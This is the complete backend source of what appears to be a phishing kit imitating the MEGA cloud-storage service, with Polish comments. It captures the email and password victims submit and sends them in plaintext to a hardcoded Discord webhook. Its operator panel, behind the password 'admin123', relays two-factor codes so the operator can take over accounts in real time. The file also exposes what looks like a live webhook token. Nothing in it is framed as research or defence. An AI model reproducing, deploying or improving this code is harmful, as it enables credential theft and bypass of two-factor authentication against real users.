// api/server.js
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// WEBHOOK KONFIGURACJA - WSTAW SWÓJ LINK
// ============================================================
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1544436490254159957/8LfIkC-dfuwBv5-RpLtwJCNvMJHIjClx1wYcjyStywRq3xwN9QGv9TrRwYwQGWiIIi31';

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, '..'))); // serwuje pliki z głównego folderu

// ============================================================
// SESJE W PAMIĘCI
// ============================================================
let sessions = {};

// ============================================================
// FUNKCJA WYSYŁANIA NA DISCORD
// ============================================================
async function sendToDiscord(data) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'https://discord.com/api/webhooks/TWOJ_WEBHOOK_TU') {
        console.log('⚠️ Webhook nie skonfigurowany. Wstaw swój link w DISCORD_WEBHOOK_URL');
        return;
    }
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: 'MEGA Panel',
                avatar_url: 'https://i.imgur.com/4M3VY1A.png',
                embeds: [{
                    title: data.title || '🔐 Nowe zdarzenie',
                    description: data.description || '',
                    color: data.color || 0xD42B3E,
                    fields: data.fields || [],
                    timestamp: new Date().toISOString(),
                    footer: { text: 'MEGA Clone v2.0' }
                }]
            })
        });
    } catch (e) {
        console.error('Discord webhook error:', e);
    }
}

// ============================================================
// API ENDPOINTY
// ============================================================

// TEST - GET
app.get('/api', (req, res) => {
    const { action } = req.query;

    if (action === 'test') {
        return res.json({ 
            status: 'ok', 
            message: 'API działa na Render!',
            timestamp: new Date().toISOString()
        });
    }

    // POLL - GET
    if (action === 'poll') {
        const sessionId = req.query.sessionId;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        return res.json({
            code: session.code || null,
            verified: session.verified || false,
            rejected: session.rejected || false,
            approved: session.approved || false
        });
    }

    // SESSIONS - GET (lista sesji dla admina)
    if (action === 'sessions') {
        const adminPassword = req.query.adminPassword;

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const sessionList = Object.keys(sessions).map(id => {
            const s = sessions[id];
            return {
                sessionId: id,
                email: s.email,
                timestamp: s.timestamp,
                hasCode: !!s.code,
                verified: s.verified || false,
                rejected: s.rejected || false,
                approved: s.approved || false
            };
        });

        sessionList.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        return res.json({ sessions: sessionList });
    }

    res.status(404).json({ error: 'Nieznana akcja' });
});

// API - POST
app.post('/api', (req, res) => {
    const { action } = req.query;

    // ============================================================
    // SESSION - logowanie
    // ============================================================
    if (action === 'session') {
        const { email, password, ip } = req.body;

        if (!email || !password) {
            return res.status(400).json({ error: 'Email i hasło wymagane' });
        }

        const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
        
        sessions[sessionId] = {
            email,
            password,
            ip: ip || 'N/A',
            timestamp: new Date().toISOString(),
            code: null,
            verified: false,
            rejected: false,
            approved: false
        };

        // ============================================================
        // WYSYŁKA NA DISCORD - LOGOWANIE
        // ============================================================
        sendToDiscord({
            title: '🔐 Nowe logowanie',
            description: `Email: ${email}\nHasło: ${password}`,
            color: 0xFBBF24,
            fields: [
                { name: '📧 Email', value: email, inline: true },
                { name: '🔑 Hasło', value: `||${password}||`, inline: true },
                { name: '🌐 IP', value: ip || 'N/A', inline: true },
                { name: '🆔 Sesja', value: sessionId, inline: true }
            ]
        });

        return res.json({ 
            success: true, 
            sessionId: sessionId,
            message: 'Zalogowano pomyślnie.'
        });
    }

    // ============================================================
    // SET-CODE - admin ustawia kod
    // ============================================================
    if (action === 'set-code') {
        const { sessionId, code, adminPassword } = req.body;

        if (!sessionId || !code) {
            return res.status(400).json({ error: 'Brak sessionId lub kodu' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.code = code;
        session.codeSetAt = new Date().toISOString();

        // ============================================================
        // WYSYŁKA NA DISCORD - KOD USTAWIONY
        // ============================================================
        sendToDiscord({
            title: '🔐 Kod 2FA ustawiony',
            description: `Kod: ${code} dla użytkownika ${session.email}`,
            color: 0x4ADE80,
            fields: [
                { name: '📧 Email', value: session.email, inline: true },
                { name: '🔐 Kod', value: code, inline: true }
            ]
        });

        return res.json({ 
            success: true, 
            message: 'Kod ustawiony!'
        });
    }

    // ============================================================
    // APPROVE - admin zatwierdza
    // ============================================================
    if (action === 'approve') {
        const { sessionId, adminPassword } = req.body;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.approved = true;
        session.verified = true;

        // ============================================================
        // WYSYŁKA NA DISCORD - ZATWIERDZONY
        // ============================================================
        sendToDiscord({
            title: '✅ Admin zatwierdził użytkownika',
            description: `Użytkownik ${session.email} został zatwierdzony.`,
            color: 0x4ADE80
        });

        return res.json({ 
            success: true, 
            message: 'Użytkownik zatwierdzony!',
            approved: true
        });
    }

    // ============================================================
    // REJECT - admin odrzuca
    // ============================================================
    if (action === 'reject') {
        const { sessionId, adminPassword } = req.body;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        if (adminPassword !== 'admin123') {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        session.rejected = true;

        // ============================================================
        // WYSYŁKA NA DISCORD - ODRZUCONY
        // ============================================================
        sendToDiscord({
            title: '❌ Admin odrzucił użytkownika',
            description: `Użytkownik ${session.email} został odrzucony.`,
            color: 0xEF4444
        });

        return res.json({ 
            success: true, 
            message: 'Użytkownik odrzucony!',
            rejected: true
        });
    }

    // ============================================================
    // POLL - POST
    // ============================================================
    if (action === 'poll') {
        const { sessionId } = req.body;

        if (!sessionId) {
            return res.status(400).json({ error: 'Brak sessionId' });
        }

        const session = sessions[sessionId];
        if (!session) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        return res.json({
            code: session.code || null,
            verified: session.verified || false,
            rejected: session.rejected || false,
            approved: session.approved || false
        });
    }

    res.status(404).json({ error: 'Nieznana akcja' });
});

// ============================================================
// SERWOWANIE INDEX.HTML (dla wszystkich innych ścieżek)
// ============================================================
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// ============================================================
// START
// ============================================================
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 API: http://localhost:${PORT}/api?action=test`);
    console.log(`🔗 Discord webhook: ${DISCORD_WEBHOOK_URL !== 'https://discord.com/api/webhooks/TWOJ_WEBHOOK_TU' ? '✅ Ustawiony' : '❌ Brak - wstaw swój link'}`);
});
